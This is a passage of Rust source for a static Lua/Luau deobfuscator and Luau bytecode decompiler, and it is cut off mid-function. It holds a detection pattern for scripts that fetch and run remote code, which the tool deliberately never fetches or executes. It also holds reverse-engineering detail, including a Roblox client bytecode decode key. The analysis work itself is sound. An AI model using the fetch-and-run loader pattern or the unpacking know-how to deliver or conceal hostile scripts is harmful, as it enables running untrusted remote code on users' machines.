use std::alloc::{alloc as raw_alloc, dealloc as raw_dealloc, Layout};
use std::slice;
use std::str;

const VERSION: &str = "0.3.0";
static mut LAST_OUTPUT_LEN: usize = 0;

#[no_mangle]
pub extern "C" fn alloc(size: usize) -> *mut u8 {
    let layout = Layout::array::<u8>(size.max(1)).unwrap();
    unsafe { raw_alloc(layout) }
}

#[no_mangle]
pub unsafe extern "C" fn dealloc(ptr: *mut u8, size: usize) {
    if !ptr.is_null() {
        if let Ok(layout) = Layout::array::<u8>(size.max(1)) {
            raw_dealloc(ptr, layout);
        }
    }
}

#[no_mangle]
pub extern "C" fn engine_run(ptr: *const u8, len: usize, mode: u32) -> *mut u8 {
    if ptr.is_null() || len > 32 * 1024 * 1024 {
        return output_ptr(error_json("Input is empty or exceeds the 32 MiB engine limit."));
    }
    let bytes = unsafe { slice::from_raw_parts(ptr, len) };
    let is_bytecode_signature = bytes.starts_with(b"\\x1bLua") || bytes.starts_with(b"\\x1bLuau");
    let response = if mode == 1 || is_bytecode_signature {
        inspect_bytecode(bytes)
    } else {
        match str::from_utf8(bytes) {
            Ok(source) => analyze_source(source),
            Err(_) => {
                let source = String::from_utf8_lossy(bytes);
                analyze_source(&source)
            }
        }
    };
    output_ptr(response)
}

#[no_mangle]
pub unsafe extern "C" fn result_len() -> usize {
    LAST_OUTPUT_LEN
}

#[no_mangle]
pub unsafe extern "C" fn free_result(ptr: *mut u8, len: usize) {
    if !ptr.is_null() && len > 0 {
        let slice_ptr = std::ptr::slice_from_raw_parts_mut(ptr, len);
        drop(Box::from_raw(slice_ptr));
    }
}

fn output_ptr(response: String) -> *mut u8 {
    let boxed = response.into_bytes().into_boxed_slice();
    let len = boxed.len();
    let ptr = Box::into_raw(boxed) as *mut u8;
    unsafe { LAST_OUTPUT_LEN = len; }
    ptr
}

fn error_json(message: &str) -> String {
    format!(
        "{{\"ok\":false,\"engine\":\"Deobfuscator Lab Rust\",\"version\":\"{}\",\"error\":\"{}\"}}",
        VERSION,
        json_escape(message)
    )
}

fn json_escape(value: &str) -> String {
    let mut out = String::with_capacity(value.len() + 8);
    for ch in value.chars() {
        match ch {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            c if (c as u32) < 0x20 => out.push_str(&format!("\\u{:04x}", c as u32)),
            c => out.push(c),
        }
    }
    out
}

fn quote_json_array(values: &[String]) -> String {
    let items: Vec<String> = values.iter().map(|s| format!("\"{}\"", json_escape(s))).collect();
    format!("[{}]", items.join(","))
}

fn analyze_source(source: &str) -> String {
    let (normalized, comments_removed, strings_normalized, long_strings_normalized, mut issues) =
        normalize_source(source);
    let lower = source.to_ascii_lowercase();
    let looks_like_loader = lower.contains("loadstring")
        && (lower.contains("httpget") || lower.contains("request(") || lower.contains("http_request"));

    // A loader is not the protected payload. Never present the loader itself
    // as a recovered result and never fetch or execute its remote target.
    let mut output = normalized;
    let mut expressions_folded = 0usize;
    let mut static_calls_folded = 0usize;
    let mut locals_propagated = 0usize;
    let mut table_indices_folded = 0usize;
    let mut branches_removed = 0usize;
    let mut analysis_rounds = 0usize;
    let mut converged = looks_like_loader;

    if looks_like_loader {
        output.clear();
        issues.push("Loader-only input detected. The remote payload was not fetched or executed; select a local file containing the protected source.".to_string());
    } else {
        // Deterministic fixed-point passes. This never executes the input.
        // Additional rounds allow nested decoder expressions to collapse in stages.
        for _ in 0..32 {
            analysis_rounds += 1;
            let before = output.clone();
            let (next, calls) = fold_static_calls(&output);
            static_calls_folded += calls;
            let (next, expressions) = fold_constant_expressions(&next);
            expressions_folded += expressions;
            let (next, locals) = propagate_local_constants(&next);
            locals_propagated += locals;
            let (next, table_indices) = fold_static_table_indices(&next);
            table_indices_folded += table_indices;
            let (next, branches) = simplify_constant_control_flow(&next);
            branches_removed += branches;
            output = next;
            if output == before {
                converged = true;
                break;
            }
        }

        if !converged {
            issues.push("Static passes reached the 32-round safety limit; the output may contain further recoverable expressions.".to_string());
        }
    }

    let (delimiter_ok, delimiter_issues) = check_delimiters(&output);
    issues.extend(delimiter_issues);
    let findings = source_findings(source);

    let transformations = comments_removed + strings_normalized + long_strings_normalized
        + expressions_folded + static_calls_folded + locals_propagated
        + table_indices_folded + branches_removed;
    let bytes = source.as_bytes().len();
    let chars = source.chars().count();
    let format_name = if looks_like_loader {
        "Lua/Luau dynamic loader"
    } else {
        "Lua/Luau source"
    };
    let summary = if looks_like_loader {
        "Loader detected, but the protected payload is not present in this input. No remote content was fetched and no script was executed.".to_string()
    } else if transformations == 0 {
        "Analysis completed; no supported static transformation was applicable. The output is not claimed to be deobfuscated."
            .to_string()
    } else {
        format!(
            "Static recovery applied {} transformation(s). Review warnings; complex VM-based obfuscation may remain.",
            transformations
        )
    };

    format!(
        "{{\"ok\":true,\"engine\":\"Deobfuscator Lab Rust\",\"version\":\"{}\",\"mode\":\"source\",\"format\":\"{}\",\"summary\":\"{}\",\"output\":\"{}\",\"metrics\":{{\"bytes\":{},\"characters\":{},\"output_bytes\":{},\"comments_removed\":{},\"strings_normalized\":{},\"long_strings_normalized\":{},\"constant_expressions_folded\":{},\"static_calls_folded\":{},\"local_constants_propagated\":{},\"constant_table_indices_folded\":{},\"constant_branches_removed\":{},\"transformations_total\":{},\"analysis_rounds\":{},\"analysis_passes\":{},\"analysis_round_limit\":32,\"delimiter_check\":\"{}\"}},\"findings\":{},\"warnings\":{},\"scope\":\"Deterministic static source recovery; no script execution, network access, or model calls. Only understood constant expressions, selected pure string calls, simple local constants, and provably constant branches are rewritten. Unsupported syntax is preserved.\"}}",
        VERSION,
        json_escape(format_name),
        json_escape(&summary),
        json_escape(&output),
        bytes,
        chars,
        output.as_bytes().len(),
        comments_removed,
        strings_normalized,
        long_strings_normalized,
        expressions_folded,
        static_calls_folded,
        locals_propagated,
        table_indices_folded,
        branches_removed,
        transformations,
        analysis_rounds,
        analysis_rounds * 5,
        if delimiter_ok { "balanced" } else { "mismatch" },
        quote_json_array(&findings),
        quote_json_array(&issues)
    )
}

fn normalize_source(source: &str) -> (String, usize, usize, usize, Vec<String>) {
    let b = source.as_bytes();
    let mut i = 0;
    let mut out = String::with_capacity(source.len());
    let mut comments = 0;
    let mut strings = 0;
    let mut long_strings = 0;
    let mut issues = Vec::new();

    while i < b.len() {
        // Lua/Luau line and long comments.
        if b[i] == b'-' && i + 1 < b.len() && b[i + 1] == b'-' {
            comments += 1;
            if let Some((content_start, close)) = long_opener(b, i + 2) {
                if let Some(end) = find_bytes(b, content_start, &close) {
                    preserve_newlines(b, i, end + close.len(), &mut out);
                    i = end + close.len();
                } else {
                    preserve_newlines(b, i, b.len(), &mut out);
                    issues.push("An unterminated long comment was found; its text was removed only up to end-of-file.".to_string());
                    i = b.len();
                }
            } else {
                while i < b.len() && b[i] != b'\n' && b[i] != b'\r' { i += 1; }
                // Keep the line ending so source locations remain roughly stable.
            }
            continue;
        }

        // Quoted Lua strings. Unknown/invalid escapes are preserved verbatim.
        if b[i] == b'"' || b[i] == b'\'' {
            match decode_quoted(b, i) {
                Ok((end, decoded)) => {
                    let normalized = quote_lua_bytes(&decoded);
                    let original = &source[i..end];
                    if normalized != original { strings += 1; }
                    out.push_str(&normalized);
                    i = end;
                }
                Err(reason) => {
                    issues.push(format!("String near byte {} was preserved unchanged: {}.", i, reason));
                    let end = find_quoted_end(b, i);
                    out.push_str(&source[i..end]);
                    i = end;
                }
            }
            continue;
        }

        // Lua long-bracket strings; the initial newline is discarded by Lua semantics.
        if b[i] == b'[' {
            if let Some((content_start, close)) = long_opener(b, i) {
                if let Some(end) = find_bytes(b, content_start, &close) {
                    let mut content_start_actual = content_start;
                    if content_start_actual < end && b[content_start_actual] == b'\n' {
                        content_start_actual += 1;
                    } else if content_start_actual + 1 < end
                        && b[content_start_actual] == b'\r'
                        && b[content_start_actual + 1] == b'\n'
                    {
                        content_start_actual += 2;
                    }
                    let decoded = &b[content_start_actual..end];
                    out.push_str(&quote_lua_bytes(decoded));
                    long_strings += 1;
                    i = end + close.len();
                    continue;
                } else {
                    issues.push(format!("Long-bracket string near byte {} is not terminated; it was preserved.", i));
                }
            }
        }

        // Luau interpolated strings are left untouched: nested interpolation needs a parser.
        if b[i] == 96 {
            let end = find_backtick_end(b, i);
            out.push_str(&source[i..end]);
            if end == b.len() && (b.len() == i + 1 || b[b.len() - 1] != 96) {
                issues.push(format!("Backtick string near byte {} may be unterminated; it was preserved.", i));
            }
            i = end;
            continue;
        }

        let ch_len = source[i..].chars().next().map(|c| c.len_utf8()).unwrap_or(1);
        out.push_str(&source[i..i + ch_len]);
        i += ch_len;
    }
    (out, comments, strings, long_strings, issues)
}

fn long_opener(b: &[u8], start: usize) -> Option<(usize, Vec<u8>)> {
    if start >= b.len() || b[start] != b'[' { return None; }
    let mut j = start + 1;
    while j < b.len() && b[j] == b'=' { j += 1; }
    if j < b.len() && b[j] == b'[' {
        let eq_count = j - start - 1;
        let mut close = Vec::with_capacity(eq_count + 2);
        close.push(b']');
        for _ in 0..eq_count { close.push(b'='); }
        close.push(b']');
        Some((j + 1, close))
    } else {
        None
    }
}

fn find_bytes(b: &[u8], from: usize, needle: &[u8]) -> Option<usize> {
    if needle.is_empty() { return Some(from); }
    if from > b.len() || needle.len() > b.len().saturating_sub(from) { return None; }
    (from..=b.len() - needle.len()).find(|&i| &b[i..i + needle.len()] == needle)
}

fn preserve_newlines(b: &[u8], start: usize, end: usize, out: &mut String) {
    for byte in &b[start..end] {
        if *byte == b'\n' { out.push('\n'); }
        else if *byte == b'\r' { out.push('\r'); }
    }
}

fn find_quoted_end(b: &[u8], start: usize) -> usize {
    let quote = b[start];
    let mut i = start + 1;
    while i < b.len() {
        if b[i] == b'\\' { i = (i + 2).min(b.len()); continue; }
        if b[i] == quote { return i + 1; }
        if b[i] == b'\n' || b[i] == b'\r' { return i; }
        i += 1;
    }
    b.len()
}

fn decode_quoted(b: &[u8], start: usize) -> Result<(usize, Vec<u8>), &'static str> {
    let quote = *b.get(start).ok_or("missing opening quote")?;
    let mut i = start + 1;
    let mut decoded = Vec::new();
    while i < b.len() {
        let c = b[i];
        if c == quote { return Ok((i + 1, decoded)); }
        if c == b'\n' || c == b'\r' { return Err("raw newline inside a quoted string"); }
        if c != b'\\' {
            decoded.push(c);
            i += 1;
            continue;
        }
        i += 1;
        if i >= b.len() { return Err("escape at end-of-file"); }
        let e = b[i];
        i += 1;
        match e {
            b'a' => decoded.push(7),
            b'b' => decoded.push(8),
            b'f' => decoded.push(12),
            b'n' => decoded.push(b'\n'),
            b'r' => decoded.push(b'\r'),
            b't' => decoded.push(b'\t'),
            b'v' => decoded.push(11),
            b'\\' => decoded.push(b'\\'),
            b'"' => decoded.push(b'"'),
            b'\'' => decoded.push(b'\''),
            b'\n' => decoded.push(b'\n'),
            b'\r' => {
                if i < b.len() && b[i] == b'\n' { i += 1; }
                decoded.push(b'\n');
            }
            b'z' => {
                while i < b.len() && (b[i] == b' ' || b[i] == b'\t' || b[i] == b'\n' || b[i] == b'\r' || b[i] == 11 || b[i] == 12) {
                    i += 1;
                }
            }
            b'x' => {
                if i + 1 >= b.len() { return Err("incomplete hexadecimal escape"); }
                let hi = hex_value(b[i]).ok_or("invalid hexadecimal escape")?;
                let lo = hex_value(b[i + 1]).ok_or("invalid hexadecimal escape")?;
                decoded.push((hi << 4) | lo);
                i += 2;
            }
            b'u' => {
                if i >= b.len() || b[i] != b'{' { return Err("unsupported Unicode escape"); }
                i += 1;
                let digits_start = i;
                let mut value: u32 = 0;
                while i < b.len() && b[i] != b'}' {
                    let digit = hex_value(b[i]).ok_or("invalid Unicode escape")? as u32;
                    value = value.checked_mul(16).and_then(|v| v.checked_add(digit)).ok_or("Unicode escape overflow")?;
                    i += 1;
                    if i - digits_start > 8 { return Err("Unicode escape too long"); }
                }
                if i >= b.len() || i == digits_start { return Err("unterminated Unicode escape"); }
                i += 1;
                let ch = char::from_u32(value).ok_or("invalid Unicode code point")?;
                let mut buf = [0u8; 4];
                decoded.extend_from_slice(ch.encode_utf8(&mut buf).as_bytes());
            }
            d if d.is_ascii_digit() => {
                let mut value = (d - b'0') as u16;
                let mut count = 1;
                while count < 3 && i < b.len() && b[i].is_ascii_digit() {
                    value = value * 10 + (b[i] - b'0') as u16;
                    i += 1;
                    count += 1;
                }
                if value > 255 { return Err("decimal escape is greater than 255"); }
                decoded.push(value as u8);
            }
            _ => return Err("unknown escape sequence"),
        }
    }
    Err("unterminated string literal")
}

fn hex_value(b: u8) -> Option<u8> {
    match b {
        b'0'..=b'9' => Some(b - b'0'),
        b'a'..=b'f' => Some(b - b'a' + 10),
        b'A'..=b'F' => Some(b - b'A' + 10),
        _ => None,
    }
}

fn quote_lua_bytes(bytes: &[u8]) -> String {
    let valid = str::from_utf8(bytes).ok();
    let mut out = String::from("\"");
    if let Some(text) = valid {
        for ch in text.chars() {
            match ch {
                '"' => out.push_str("\\\""),
                '\\' => out.push_str("\\\\"),
                '\n' => out.push_str("\\n"),
                '\r' => out.push_str("\\r"),
                '\t' => out.push_str("\\t"),
                '\u{0007}' => out.push_str("\\a"),
                '\u{0008}' => out.push_str("\\b"),
                '\u{000c}' => out.push_str("\\f"),
                '\u{000b}' => out.push_str("\\v"),
                c if (c as u32) < 0x20 || c == '\u{007f}' => out.push_str(&format!("\\{:03}", c as u32)),
                c => out.push(c),
            }
        }
    } else {
        for byte in bytes {
            match *byte {
                b'"' => out.push_str("\\\""),
                b'\\' => out.push_str("\\\\"),
                b'\n' => out.push_str("\\n"),
                b'\r' => out.push_str("\\r"),
                b'\t' => out.push_str("\\t"),
                b'\x07' => out.push_str("\\a"),
                b'\x08' => out.push_str("\\b"),
                b'\x0c' => out.push_str("\\f"),
                b'\x0b' => out.push_str("\\v"),
                0x20..=0x7e => out.push(*byte as char),
                b => out.push_str(&format!("\\{:03}", b)),
            }
        }
    }
    out.push('"');
    out
}

fn find_backtick_end(b: &[u8], start: usize) -> usize {
    let mut i = start + 1;
    let mut escaped = false;
    while i < b.len() {
        let c = b[i];
        if escaped { escaped = false; i += 1; continue; }
        if c == b'\\' { escaped = true; i += 1; continue; }
        if c == 96 { return i + 1; }
        i += 1;
    }
    b.len()
}

fn check_delimiters(source: &str) -> (bool, Vec<String>) {
    let b = source.as_bytes();
    let mut stack: Vec<(u8, usize)> = Vec::new();
    let mut issues = Vec::new();
    let mut i = 0;
    while i < b.len() {
        if b[i] == b'"' || b[i] == b'\'' {
            i = find_quoted_end(b, i);
            continue;
        }
        if b[i] == 96 {
            i = find_backtick_end(b, i);
            continue;
        }
        match b[i] {
            b'(' | b'[' | b'{' => stack.push((b[i], i)),
            b')' | b']' | b'}' => {
                let expected = match b[i] { b')' => b'(', b']' => b'[', _ => b'{' };
                if let Some((open, _)) = stack.pop() {
                    if open != expected {
                        issues.push(format!("Closing delimiter '{}' near byte {} does not match the previous opener.", b[i] as char, i));
                    }
                } else {
                    issues.push(format!("Unexpected closing delimiter '{}' near byte {}.", b[i] as char, i));
                }
            }
            _ => {}
        }
        i += 1;
    }
    for (open, pos) in stack.iter().rev() {
        issues.push(format!("Opening delimiter '{}' near byte {} has no matching close.", *open as char, pos));
    }
    (issues.is_empty(), issues)
}

fn source_findings(source: &str) -> Vec<String> {
    let mut findings = Vec::new();
    let patterns: [(&str, &str); 8] = [
        ("loadstring", "Dynamic code loading pattern found; inspect where the loaded text comes from."),
        ("string.char", "Character construction pattern found; string-decoder analysis may be useful."),
        ("string.byte", "Byte-wise string processing pattern found."),
        ("bit32.", "Bitwise operations found; this may be used in a VM or decoder."),
        ("getfenv", "Environment access found; semantics may depend on the runtime."),
        ("setfenv", "Environment mutation found; semantics may depend on the runtime."),
        ("while true", "Unbounded loop pattern found; inspect control flow manually."),
        ("debug.info", "Debug/introspection API found; this may be runtime-specific."),
    ];
    let lower = source.to_ascii_lowercase();
    for (needle, finding) in patterns {
        if lower.contains(&needle.to_ascii_lowercase()) {
            findings.push(finding.to_string());
        }
    }
    let punctuation = source.chars().filter(|c| *c == ';' || *c == ',').count();
    let letters = source.chars().filter(|c| c.is_ascii_alphabetic()).count();
    if source.len() > 20_000 && punctuation > 4_000 && letters > 0 && punctuation / letters.max(1) > 2 {
        findings.push("High punctuation density: possible generated or heavily transformed source (heuristic only).".to_string());
    }
    if findings.is_empty() {
        findings.push("No targeted indicators matched. This does not prove the source is unobfuscated.".to_string());
    }
    findings
}

fn try_tovek_decompile(bytes: &[u8]) -> Result<(String, u8), String> {
    let mut errors = Vec::new();

    // Standard raw chunks use key 0; Roblox client-encoded chunks commonly use 203.
    // This is static bytecode parsing only: the input is never executed.
    for key in [0u8, 203u8] {
        match luau_lifter::try_decompile_bytecode_with_script_name(bytes, key, None) {
            Ok(source)
                if !source.trim().is_empty()
                    && !source.starts_with("-- Roblox could not compile this script") =>
            {
                return Ok((source, key));
            }
            Ok(_) => errors.push(format!("key {} produced a compiler-diagnostic stub", key)),
            Err(error) => errors.push(format!("key {}: {}", key, error)),
        }
    }

    Err(errors.join("; "))
}

fn inspect_bytecode(bytes: &[u8]) -> String {
    let size = bytes.len();

    // The real decoder runs first. It returns source only after the upstream
    // parser and lifter accept the complete chunk; failed inputs are never
    // presented as successfully decompiled code.
    match luau_core::decompile(bytes) {
        Ok(source) => {
            let bytecode_version = luau_core::bytecode_version(bytes)
                .map(|v| v.to_string())
                .unwrap_or_else(|| "unknown".to_string());
            let lines = source.lines().count();
            let summary = format!(
                "Luau bytecode decoded successfully (bytecode version {}). Review the recovered source; original comments and names may not be recoverable.",
                bytecode_version
            );
            return format!(
                "{{\"ok\":true,\"engine\":\"Deobfuscator Lab Rust + luau-core\",\"version\":\"{}\",\"mode\":\"bytecode\",\"format\":\"Luau bytecode\",\"summary\":\"{}\",\"output\":\"{}\",\"metrics\":{{\"bytes\":{},\"bytecode_version\":\"{}\",\"output_characters\":{},\"output_lines\":{}}},\"findings\":{},\"warnings\":{},\"scope\":\"Actual bytecode parsing and decompilation performed by the MIT-licensed luau-core Rust engine. This is recovered source, not a guarantee of original text identity.\"}}",
                VERSION,
                json_escape(&summary),
                json_escape(&source),
                size,
                json_escape(&bytecode_version),
                source.chars().count(),
                lines,
                quote_json_array(&vec![
                    "Luau bytecode was parsed and lifted into source code.".to_string()
                ]),
                quote_json_array(&vec![
                    "Decompilation cannot restore comments and identifiers discarded during compilation.".to_string()
                ])
            );
        }
        Err(error) => {
            // Newer Luau serializations can exceed the legacy decoder's v3–v9 range.
            // Fall back to the maintained Tovek lifter, which supports v4–v14.
            if let Ok((source, encode_key)) = try_tovek_decompile(bytes) {
                let lines = source.lines().count();
                let bytecode_version = luau_core::bytecode_version(bytes)
                    .map(|v| v.to_string())
                    .unwrap_or_else(|| "unknown".to_string());
                let summary = format!(
                    "Bytecode recovered by Tovek v2.5.1 (serialization version {}, decode key {}). This is reconstructed source, not the original text.",
                    bytecode_version, encode_key
                );
                return format!(
                    "{{\"ok\":true,\"engine\":\"Deobfuscator Lab Rust + Tovek\",\"version\":\"{}\",\"mode\":\"bytecode\",\"format\":\"Luau bytecode\",\"summary\":\"{}\",\"output\":\"{}\",\"metrics\":{{\"bytes\":{},\"bytecode_version\":\"{}\",\"decode_key\":{},\"output_characters\":{},\"output_lines\":{}}},\"findings\":{},\"warnings\":{},\"scope\":\"Static bytecode decompilation by Tovek v2.5.1; no script execution. Original comments and source identifiers may not be recoverable.\"}}",
                    VERSION,
                    json_escape(&summary),
                    json_escape(&source),
                    size,
                    json_escape(&bytecode_version),
                    encode_key,
                    source.chars().count(),
                    lines,
                    quote_json_array(&vec![
                        "Recovered with the Tovek fallback after the legacy decoder rejected the chunk.".to_string()
                    ]),
                    quote_json_array(&vec![
                        "The output is reconstructed from bytecode and may not match original source formatting or names.".to_string()
                    ])
                );
            }
            let message = format!("{:#}", error);
            let sample = bytes.iter().take(16).map(|b| format!("{:02X}", b)).collect::<Vec<_>>().join(" ");
            let version = luau_core::bytecode_version(bytes)
                .map(|v| v.to_string())
                .unwrap_or_else(|| "unknown".to_string());

            let (format_name, header_detected) = if bytes.starts_with(b"\x1bLua") {
                ("Lua-family bytecode (not Luau)", true)
            } else if bytes.starts_with(b"RSB1") {
                ("Roblox RSB1 container candidate", true)
            } else if luau_core::bytecode_version(bytes).is_some() {
                ("Luau bytecode header detected, but decoding failed", true)
            } else {
                ("unknown", false)
            };
            let summary = if header_detected {
                "A binary signature was detected, but the Luau decoder rejected the input; no source was fabricated."
            } else {
                "The file could not be decoded as a supported Luau bytecode chunk."
            };
            format!(
                "{{\"ok\":true,\"engine\":\"Deobfuscator Lab Rust + luau-core\",\"version\":\"{}\",\"mode\":\"bytecode\",\"format\":\"{}\",\"summary\":\"{}\",\"output\":\"\",\"metrics\":{{\"bytes\":{},\"header_detected\":{},\"bytecode_version\":\"{}\",\"first_bytes\":\"{}\"}},\"findings\":{},\"warnings\":{},\"scope\":\"No source output is produced when decoding fails. The upstream core currently targets standard Roblox Luau bytecode versions 3–9 and rejects uncertain formats rather than guessing.\"}}",
                VERSION,
                json_escape(format_name),
                json_escape(summary),
                size,
                header_detected,
                json_escape(&version),
                json_escape(&sample),
                quote_json_array(&vec![
                    "The decoder did not accept this input; it may be another VM, an encrypted/compressed wrapper, or an unsupported bytecode version.".to_string()
                ]),
                quote_json_array(&vec![
                    format!("Decoder detail: {}", message)
                ])
            )
        }
    }
}


#[derive(Clone, Debug, PartialEq)]
enum ConstValue {
    Nil,
    Bool(bool),
    Number(f64),
    String(Vec<u8>),
}

impl ConstValue {
    fn truthy(&self) -> bool {
        !matches!(self, ConstValue::Nil | ConstValue::Bool(false))
    }

    fn to_lua(&self) -> String {
        match self {
            ConstValue::Nil => "nil".to_string(),
            ConstValue::Bool(v) => v.to_string(),
            ConstValue::Number(v) => {
                if !v.is_finite() { return "nil".to_string(); }
                if v.fract() == 0.0 && v.abs() < 9_007_199_254_740_991.0 {
                    format!("{:.0}", v)
                } else {
                    let rendered = v.to_string();
                    if rendered == "-0" { "0".to_string() } else { rendered }
                }
            }
            ConstValue::String(v) => quote_lua_bytes(v),
        }
    }

    fn as_number(&self) -> Option<f64> {
        match self { ConstValue::Number(v) if v.is_finite() => Some(*v), _ => None }
    }

    fn as_string(&self) -> Option<&[u8]> {
        match self { ConstValue::String(v) => Some(v.as_slice()), _ => None }
    }
}

#[derive(Clone, Debug, PartialEq)]
enum TokenKind {
    Ident,
    Number,
    String,
    Symbol,
    Opaque,
}

#[derive(Clone, Debug)]
struct Token {
    start: usize,
    end: usize,
    line: usize,
    text: String,
    kind: TokenKind,
}

fn lex_source(source: &str) -> Vec<Token> {
    let bytes = source.as_bytes();
    let mut tokens = Vec::new();
    let mut i = 0usize;
    let mut line = 1usize;

    while i < bytes.len() {
        if bytes[i].is_ascii_whitespace() {
            if bytes[i] == b'\n' { line += 1; }
            i += 1;
            continue;
        }

        if bytes[i] == b'-' && i + 1 < bytes.len() && bytes[i + 1] == b'-' {
            let start = i;
            if let Some((content_start, close)) = long_opener(bytes, i + 2) {
                if let Some(end) = find_bytes(bytes, content_start, &close) {
                    i = end + close.len();
                } else {
                    i = bytes.len();
                }
            } else {
                while i < bytes.len() && bytes[i] != b'\n' && bytes[i] != b'\r' { i += 1; }
            }
            line += bytes[start..i].iter().filter(|b| **b == b'\n').count();
            continue;
        }

        let start = i;
        let token_line = line;
        let kind;
        if bytes[i] == b'"' || bytes[i] == b'\'' {
            i = find_quoted_end(bytes, i);
            kind = TokenKind::String;
        } else if bytes[i] == 96 {
            i = find_backtick_end(bytes, i);
            kind = TokenKind::Opaque;
        } else if bytes[i].is_ascii_alphabetic() || bytes[i] == b'_' {
            i += 1;
            while i < bytes.len() && (bytes[i].is_ascii_alphanumeric() || bytes[i] == b'_') { i += 1; }
            kind = TokenKind::Ident;
        } else if bytes[i].is_ascii_digit()
            || (bytes[i] == b'.' && i + 1 < bytes.len() && bytes[i + 1].is_ascii_digit())
        {
            i = scan_number(bytes, i);
            kind = TokenKind::Number;
        } else if bytes[i] >= 0x80 {
            let n = source[i..].chars().next().map(|c| c.len_utf8()).unwrap_or(1);
            i += n;
            kind = TokenKind::Opaque;
        } else {
            let rest = &bytes[i..];
            let width = if rest.starts_with(b"...") || rest.starts_with(b"..=") || rest.starts_with(b"<<=") || rest.starts_with(b">>=") {
                3
            } else if rest.starts_with(b"..") || rest.starts_with(b"//") || rest.starts_with(b"==")
                || rest.starts_with(b"~=") || rest.starts_with(b"<=") || rest.starts_with(b">=")
                || rest.starts_with(b"+=") || rest.starts_with(b"-=") || rest.starts_with(b"*=")
                || rest.starts_with(b"/=") || rest.starts_with(b"%=") || rest.starts_with(b"^=")
                || rest.starts_with(b"<<") || rest.starts_with(b">>") || rest.starts_with(b"::")
                || rest.starts_with(b"->")
            {
                2
            } else { 1 };
            i = (i + width).min(bytes.len());
            kind = TokenKind::Symbol;
        }

        line += bytes[start..i].iter().filter(|b| **b == b'\n').count();
        if let Some(raw) = source.get(start..i) {
            tokens.push(Token { start, end: i, line: token_line, text: raw.to_string(), kind });
        }
    }
    tokens
}

fn scan_number(bytes: &[u8], start: usize) -> usize {
    let mut i = start;
    if i + 1 < bytes.len() && bytes[i] == b'0' && matches!(bytes[i + 1], b'x' | b'X' | b'b' | b'B' | b'o' | b'O') {
        let base = bytes[i + 1].to_ascii_lowercase();
        i += 2;
        while i < bytes.len() && (bytes[i].is_ascii_alphanumeric() || bytes[i] == b'_') { i += 1; }
        if base == b'x' && i < bytes.len() && bytes[i] == b'.' && !(i + 1 < bytes.len() && bytes[i + 1] == b'.') {
            i += 1;
            while i < bytes.len() && (bytes[i].is_ascii_hexdigit() || bytes[i] == b'_') { i += 1; }
            if i < bytes.len() && matches!(bytes[i], b'p' | b'P') {
                i += 1;
                if i < bytes.len() && matches!(bytes[i], b'+' | b'-') { i += 1; }
                while i < bytes.len() && (bytes[i].is_ascii_digit() || bytes[i] == b'_') { i += 1; }
            }
        }
        return i;
    }

    if bytes[i] == b'.' { i += 1; }
    while i < bytes.len() && (bytes[i].is_ascii_digit() || bytes[i] == b'_') { i += 1; }
    if i < bytes.len() && bytes[i] == b'.' && !(i + 1 < bytes.len() && bytes[i + 1] == b'.') {
        i += 1;
        while i < bytes.len() && (bytes[i].is_ascii_digit() || bytes[i] == b'_') { i += 1; }
    }
    if i < bytes.len() && matches!(bytes[i], b'e' | b'E') {
        let exponent_start = i;
        i += 1;
        if i < bytes.len() && matches!(bytes[i], b'+' | b'-') { i += 1; }
        let digits_start = i;
        while i < bytes.len() && (bytes[i].is_ascii_digit() || bytes[i] == b'_') { i += 1; }
        if digits_start == i { i = exponent_start; }
    }
    i
}

fn parse_number(raw: &str) -> Option<f64> {
    let clean = raw.replace('_', "");
    let lower = clean.to_ascii_lowercase();
    if let Some(digits) = lower.strip_prefix("0x") {
        if digits.contains('p') || digits.contains('.') { return None; }
        return u128::from_str_radix(digits, 16).ok().map(|v| v as f64);
    }
    if let Some(digits) = lower.strip_prefix("0b") {
        return u128::from_str_radix(digits, 2).ok().map(|v| v as f64);
    }
    if let Some(digits) = lower.strip_prefix("0o") {
        return u128::from_str_radix(digits, 8).ok().map(|v| v as f64);
    }
    clean.parse::<f64>().ok().filter(|v| v.is_finite())
}

fn constant_from_token(source: &str, token: &Token) -> Option<ConstValue> {
    match token.kind {
        TokenKind::Number => parse_number(&token.text).map(ConstValue::Number),
        TokenKind::String => {
            let bytes = source.as_bytes();
            match decode_quoted(bytes, token.start) {
                Ok((end, decoded)) if end == token.end => Some(ConstValue::String(decoded)),
                _ => None,
            }
        }
        TokenKind::Ident => match token.text.as_str() {
            "true" => Some(ConstValue::Bool(true)),
            "false" => Some(ConstValue::Bool(false)),
            "nil" => Some(ConstValue::Nil),
            _ => None,
        },
        _ => None,
    }
}

#[derive(Clone, Debug)]
struct ExprNode {
    start: usize,
    end: usize,
    value: Option<ConstValue>,
    has_operator: bool,
    children: Vec<ExprNode>,
}

fn binary_precedence(op: &str) -> Option<(u8, bool)> {
    match op {
        "or" => Some((1, false)),
        "and" => Some((2, false)),
        "==" | "~=" | "<" | ">" | "<=" | ">=" => Some((3, false)),
        "|" => Some((4, false)),
        "~" => Some((5, false)),
        "&" => Some((6, false)),
        "<<" | ">>" => Some((7, false)),
        ".." => Some((8, true)),
        "+" | "-" => Some((9, false)),
        "*" | "/" | "//" | "%" => Some((10, false)),
        "^" => Some((12, true)),
        _ => None,
    }
}

fn integer_value(value: &ConstValue) -> Option<i64> {
    match value {
        ConstValue::Number(n) if n.is_finite() && n.fract() == 0.0 && *n >= i64::MIN as f64 && *n <= i64::MAX as f64 => Some(*n as i64),
        _ => None,
    }
}

fn value_eq(left: &ConstValue, right: &ConstValue) -> bool {
    match (left, right) {
        (ConstValue::Nil, ConstValue::Nil) => true,
        (ConstValue::Bool(a), ConstValue::Bool(b)) => a == b,
        (ConstValue::Number(a), ConstValue::Number(b)) => a == b,
        (ConstValue::String(a), ConstValue::String(b)) => a == b,
        _ => false,
    }
}

fn concat_bytes(value: &ConstValue) -> Option<Vec<u8>> {
    match value {
        ConstValue::String(v) => Some(v.clone()),
        ConstValue::Number(v) if v.is_finite() => Some(v.to_string().into_bytes()),
        _ => None,
    }
}

fn eval_unary(op: &str, value: &ConstValue) -> Option<ConstValue> {
    match op {
        "not" => Some(ConstValue::Bool(!value.truthy())),
        "+" => value.as_number().map(ConstValue::Number),
        "-" => value.as_number().map(|n| ConstValue::Number(-n)).filter(|v| v.as_number().is_some()),
        "~" => integer_value(value).map(|n| ConstValue::Number((!(n as u32)) as i32 as f64)),
        "#" => value.as_string().map(|s| ConstValue::Number(s.len() as f64)),
        _ => None,
    }
